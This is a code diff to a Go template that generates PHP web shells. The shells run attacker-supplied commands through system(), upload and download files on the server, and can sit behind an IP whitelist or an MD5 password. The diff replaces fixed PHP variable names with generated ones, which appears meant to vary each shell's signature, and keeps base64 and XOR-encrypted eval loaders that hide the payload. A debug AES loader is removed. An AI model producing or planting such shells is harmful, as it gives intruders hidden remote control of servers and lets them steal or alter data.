@@ -1,76 +1,74 @@
+{{/* Get command from param or header */}}
 {{ if ne .CmdHeader "" }}
-  $cmd = $_SERVER['HTTP_{{ .CmdHeader }}'];
+  {{ index .V "cmd" }} = $_SERVER['HTTP_{{ .CmdHeader }}'];
 {{ else }}
 
 {{ if ne .Method "GET" }}
   parse_str(file_get_contents('php://input'), $_REQUEST);
 {{ end }}
 
-{{ if ne .Method "" }}
-  $cmd = $_REQUEST['{{ .CmdParam }}'];
+  {{ index .V "cmd" }} = $_REQUEST['{{ .CmdParam }}'];
 {{ end }}
-
-{{ end }}
-  $cmd = trim($cmd);
+  {{ index .V "cmd" }} = trim({{ index .V "cmd" }});
 
 
 {{ if .Whitelist }}
-  $whitelist = array({{ range $ip := .WhitelistSlice }}'{{ $ip }}',{{ end }});
-  if (!in_array($_SERVER['REMOTE_ADDR'], $whitelist)) {
+  {{ index .V "whitelist" }} = array({{ .Whitelist }});
+  if (!in_array($_SERVER['REMOTE_ADDR'], {{ index .V "whitelist" }})) {
     die;
   }
 {{- end }}
 
 
 {{ if ne .Password "" }}
-  $hash = '{{ .PasswordHash }}';
+  {{ index .V "hash" }} = '{{ .PasswordHash }}';
 {{ if ne .PasswordParam "" }}
 
 {{ if ne .Method "" }}
-  $pass = $_REQUEST['{{ .PasswordParam }}'];
+  {{ index .V "pass" }} = $_REQUEST['{{ .PasswordParam }}'];
 {{ end }}
 
 {{ else if ne .PasswordHeader "" }}
-  $pass = $_SERVER['HTTP_{{ .PasswordHeader }}'];
+  {{ index .V "pass" }} = $_SERVER['HTTP_{{ .PasswordHeader }}'];
 {{ end }}
-  if (md5($pass) != $hash) {
+  if (md5({{ index .V "pass" }}) != {{ index .V "hash" }}) {
     die;
   }
 {{- end }}
 
 
 {{ if .FileCapabilities }}
-  if (substr($cmd, 0, 4) === 'get ') {
-    $c = explode(' ', $cmd);
-    $path = $c[1];
-    if (!file_exists($path)) {
-      echo '$path not found';
+  if (substr({{ index .V "cmd" }}, 0, 4) === 'get ') {
+    {{ index .V "cmdArgs" }} = explode(' ', {{ index .V "cmd" }});
+    {{ index .V "filePath" }} = {{ index .V "cmdArgs" }}[1];
+    if (!file_exists({{ index .V "filePath" }})) {
+      header("HTTP/1.1 404 Not Found");
       die;
     }
-    header("Content-Disposition: attachment; filename=$path");
+    header("Content-Disposition: attachment; filename={{ index .V "filePath" }}");
     header("Content-Type: application/octet-stream");
     header("Content-Transfer-Encoding: binary");
-    header('Content-Length: ' . filesize($path));
-    readfile($path);
+    header('Content-Length: ' . filesize({{ index .V "filePath" }}));
+    readfile({{ index .V "filePath" }});
     die;
-  } else if (substr($cmd, 0, 4) === 'put ') {
-    $c = explode(' ', $cmd);
-    $fileName = $c[1];
-    $destPath = basename($c[1]);
-    if (count($c) > 2) {
-      $destPath = $c[2];
+  } else if (substr({{ index .V "cmd" }}, 0, 4) === 'put ') {
+    {{ index .V "cmdArgs" }} = explode(' ', {{ index .V "cmd" }});
+    {{ index .V "filePath" }} = {{ index .V "cmdArgs" }}[1];
+    {{ index .V "destPath" }} = basename({{ index .V "cmdArgs" }}[1]);
+    if (count({{ index .V "cmdArgs" }}) > 2) {
+      {{ index .V "destPath" }} = {{ index .V "cmdArgs" }}[2];
     }
-    if (file_exists($destPath)) {
-      echo $destPath.' already exists';
+    if (file_exists({{ index .V "destPath" }})) {
+      echo {{ index .V "destPath" }}.' already exists';
       die;
     }
-    file_put_contents($destPath, file_get_contents('php://input'));
-    echo 'Uploaded '.$fileName.' to '.$destPath;
+    file_put_contents({{ index .V "destPath" }}, file_get_contents('php://input'));
+    echo 'Uploaded '.{{ index .V "filePath" }}.' to '.{{ index .V "destPath" }};
     die;
   }
 {{ end }}
 
-  system($cmd);
+  system({{ index .V "cmd" }});
   die;
 
 
@@ -83,54 +81,19 @@ eval(base64_decode('{{ .EncCode }}'))
 
 {{ define "xor" }}
 {{ if ne .EncHeader "" -}}
-  $k = $_SERVER['HTTP_{{ .EncHeader }}'];
+  {{ index .V "encKey" }} = $_SERVER['HTTP_{{ .EncHeader }}'];
 {{ else if eq .Method "GET" -}}
-  $k = $_REQUEST['{{ .EncParam }}'];
+  {{ index .V "encKey" }} = $_REQUEST['{{ .EncParam }}'];
 {{ else if eq .Method "POST" -}}
-  $k = json_decode(file_get_contents('php://input'), true)['{{ .EncParam }}'];
+  {{ index .V "encKey" }} = json_decode(file_get_contents('php://input'), true)['{{ .EncParam }}'];
 {{ end -}}
 
-$e = base64_decode('{{ .EncCode }}');
-$d = "";
-for($i=0; $i<strlen($e); ) {
-  for($j=0; ($j<strlen($k) && $i<strlen($e)); $j++,$i++) {
-    $d .= $e{$i} ^ $k{$j};
+{{ index .V "encSrc" }} = base64_decode('{{ .EncCode }}');
+{{ index .V "dSrc" }} = "";
+for({{ index .V "i" }}=0; {{ index .V "i" }}<strlen({{ index .V "encSrc" }}); ) {
+  for({{ index .V "ii" }}=0; ({{ index .V "ii" }}<strlen({{ index .V "encKey" }}) && {{ index .V "i" }}<strlen({{ index .V "encSrc" }})); {{ index .V "ii" }}++,{{ index .V "i" }}++) {
+    {{ index .V "dSrc" }} .= {{ index .V "encSrc" }}{ {{ index .V "i" }} } ^ {{ index .V "encKey" }}{ {{ index .V "ii" }} };
   }
 }
-eval($d);
-{{ end }}
-
-
-
-{{ define "aes" }}
-$s = "{{ .EncCode }}";
-
-$secret_key = 'key-asdf';
-$secret_iv = 'iv-asdf';
-
-$output = false;
-$encrypt_method = "AES-256-CBC";
-$key = hash('sha256', $secret_key);
-$key = hex2bin($key);
-$iv = hash('sha256', $secret_iv);
-echo $iv;
-$iv = hex2bin($iv);
-echo $iv;
-$iv = unpack('C*', $iv);
-echo $iv;
-$iv = array_slice($iv, 0, 16);
-echo $iv;
-$iv = array_map("chr", $iv);
-echo $iv;
-$iv = join($iv);
-//$iv = substr($iv, 0, 16);
-
-echo $iv;
-
-$output = openssl_decrypt($s, "AES-256-CBC", $key, 0, $iv);
-
-echo $output;
-
-eval($output);
-
+eval({{ index .V "dSrc" }});
 {{ end }}
